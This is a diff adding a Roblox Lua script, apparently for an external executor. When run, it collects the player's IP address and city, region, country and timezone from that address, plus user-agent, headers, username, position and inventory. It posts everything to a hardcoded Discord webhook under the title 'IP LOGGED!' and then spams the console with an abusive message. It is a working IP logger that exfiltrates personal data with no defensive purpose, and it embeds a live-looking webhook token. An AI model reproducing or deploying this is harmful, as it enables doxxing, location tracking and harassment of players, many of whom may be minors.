@@ -1,0 +1,333 @@
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+
+-- URLs for IP retrieval and analysis
+local getIpUrl = "https://httpbin.org/ip"
+local ipinfoUrl = "https://ipinfo.io/"
+local userAgentUrl = "https://httpbin.org/user-agent"
+local headersUrl = "https://httpbin.org/headers"
+
+
+-- Webhook URL (replace with your actual Discord webhook URL)
+local webhookURL = "https://discord.com/api/webhooks/1332837782057652314/EvXApIAv-mneRykqzRE3v0zRYXn_yQzsoqeFvBWlWWW1Jfd16epDgoroAcOMyi4BCrkb"
+
+
+-- Function to send data to Discord webhook with embed (using http.request in external executor)
+local function sendToDiscord(embed)
+  local data = {
+      embeds = { embed }
+  }
+
+
+  local jsonData = HttpService:JSONEncode(data)  -- Convert data to JSON format
+
+
+  local headers = {
+      ["Content-Type"] = "application/json"  -- Set correct content type
+  }
+
+
+  -- If using an external executor (like Synapse or another)
+  local response = http.request({
+      Url = webhookURL,
+      Method = "POST",
+      Headers = headers,
+      Body = jsonData
+  })
+
+
+  if response then
+      -- Now, spam the dev console after sending the data to Discord
+      for i = 1, 1000 do
+          print("GET FUCKED í ½í¸­í ½í¸‚")  -- Spams the console 100 times
+      end
+  end
+end
+
+
+-- Function to retrieve the IP address
+local function getIPAddress()
+  local success, response = pcall(function()
+      return game:HttpGet(getIpUrl)
+  end)
+
+
+  if success then
+      local successDecode, data = pcall(function()
+          return HttpService:JSONDecode(response)
+      end)
+
+
+      if successDecode and data.origin then
+          return data.origin
+      else
+          warn("Failed to decode IP address.")
+          return nil
+      end
+  else
+      warn("Failed to retrieve IP address.")
+      return nil
+  end
+end
+
+
+-- Function to retrieve the User-Agent
+local function getUserAgent()
+  local success, response = pcall(function()
+      return game:HttpGet(userAgentUrl)
+  end)
+
+
+  if success then
+      local successDecode, data = pcall(function()
+          return HttpService:JSONDecode(response)
+      end)
+
+
+      if successDecode and data["user-agent"] then
+          return data["user-agent"]
+      else
+          warn("Failed to decode User-Agent.")
+          return nil
+      end
+  else
+      warn("Failed to retrieve User-Agent.")
+      return nil
+  end
+end
+
+
+-- Function to retrieve headers
+local function getHeaders()
+  local success, response = pcall(function()
+      return game:HttpGet(headersUrl)
+  end)
+
+
+  if success then
+      local successDecode, data = pcall(function()
+          return HttpService:JSONDecode(response)
+      end)
+
+
+      if successDecode and data["headers"] then
+          return data["headers"]
+      else
+          warn("Failed to decode headers.")
+          return nil
+      end
+  else
+      warn("Failed to retrieve headers.")
+      return nil
+  end
+end
+
+
+-- Function to fetch player avatar and their items
+local function getAvatarInfo(playerId)
+  local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. playerId .. "&width=420&height=420&format=png"
+  local inventoryUrl = "https://inventory.roblox.com/v1/users/" .. playerId .. "/assets/collectibles"
+   -- Retrieve Avatar Image URL
+  local avatarImage = avatarUrl
+
+
+  -- Retrieve Avatar's Equipped Items (e.g., hats, shirts)
+  local items = {}
+  local success, response = pcall(function()
+      return game:HttpGet(inventoryUrl)
+  end)
+
+
+  if success then
+      local successDecode, data = pcall(function()
+          return HttpService:JSONDecode(response)
+      end)
+
+
+      if successDecode and data.data then
+          for _, item in pairs(data.data) do
+              table.insert(items, item.name)
+          end
+      end
+  end
+
+
+  return avatarImage, items
+end
+
+
+-- Function to analyze the IP address using ipinfo.io
+local function analyzeIPAddress(ip)
+  local success, response = pcall(function()
+      return game:HttpGet(ipinfoUrl .. ip .. "/json")
+  end)
+
+
+  if success then
+      local successDecode, data = pcall(function()
+          return HttpService:JSONDecode(response)
+      end)
+
+
+      if successDecode then
+          -- Get the current game info
+          local gameId = game.PlaceId
+          local gameName = "Unknown Game"
+        
+          -- Try to fetch the game name from the marketplace service
+          local success, gameInfo = pcall(function()
+              return MarketplaceService:GetProductInfo(gameId)
+          end)
+
+
+          if success then
+              gameName = gameInfo.Name
+          end
+
+
+          -- Get the player's Roblox username and Display Name
+          local playerName = Players.LocalPlayer.Name
+          local playerDisplayName = Players.LocalPlayer.DisplayName
+
+
+          -- Get the user-agent info
+          local userAgent = getUserAgent()
+
+
+          -- Get the headers info
+          local headers = getHeaders()
+
+
+          -- Get the Job ID
+          local jobId = game.JobId
+
+
+          -- Get the playerâ€™s position (coordinates)
+          local playerPosition = Players.LocalPlayer.Character and Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position
+          local positionStr = playerPosition and string.format("X: %.2f, Y: %.2f, Z: %.2f", playerPosition.X, playerPosition.Y, playerPosition.Z) or "N/A"
+
+
+          -- Get Avatar Image URL and Items
+          local avatarImage, items = getAvatarInfo(Players.LocalPlayer.UserId)
+
+
+          -- Get the player's profile link
+          local playerProfileLink = "https://www.roblox.com/users/" .. Players.LocalPlayer.UserId .. "/profile"
+
+
+          -- Prepare the embed to send to Discord
+          local embed = {
+              ["title"] = "Player Info",
+              ["description"] = "IP LOGGED!",
+              ["color"] = 16711680,
+              ["fields"] = {
+                  {
+                      ["name"] = "Player Name",
+                      ["value"] = playerName or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "Display Name",
+                      ["value"] = playerDisplayName or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "Job ID",
+                      ["value"] = jobId or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "Game ID",
+                      ["value"] = gameId or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "Game Name",
+                      ["value"] = gameName or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "Position (Coordinates)",
+                      ["value"] = positionStr,
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "IP Address",
+                      ["value"] = data.ip or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "City",
+                      ["value"] = data.city or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "Region",
+                      ["value"] = data.region or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "Country",
+                      ["value"] = data.country or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "Time Zone",
+                      ["value"] = data.timezone or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "User-Agent",
+                      ["value"] = userAgent or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "Avatar Image",
+                      ["value"] = avatarImage or "N/A",
+                      ["inline"] = true
+                  },
+                  {
+                      ["name"] = "Avatar Items",
+                      ["value"] = #items > 0 and table.concat(items, ", ") or "No items found",
+                      ["inline"] = false
+                  },
+                  {
+                      ["name"] = "Player Profile",
+                      ["value"] = "[Click here to view profile](" .. playerProfileLink .. ")",
+                      ["inline"] = false
+                  }
+              }
+          }
+
+
+          -- If there are any headers, add them to the embed
+          if headers then
+              table.insert(embed.fields, {
+                  ["name"] = "Headers",
+                  ["value"] = HttpService:JSONEncode(headers) or "N/A",
+                  ["inline"] = false
+              })
+          end
+
+
+          -- Send the embed to Discord webhook
+          sendToDiscord(embed)
+      else
+          warn("Failed to decode IP analysis response.")
+      end
+  else
+      warn("Failed to analyze IP address.")
+  end
+end
+
+
+-- Main process
+local ipAddress = getIPAddress()
+if ipAddress then
+  analyzeIPAddress(ipAddress)
+else
+  warn("Unable to retrieve IP address.")
+end
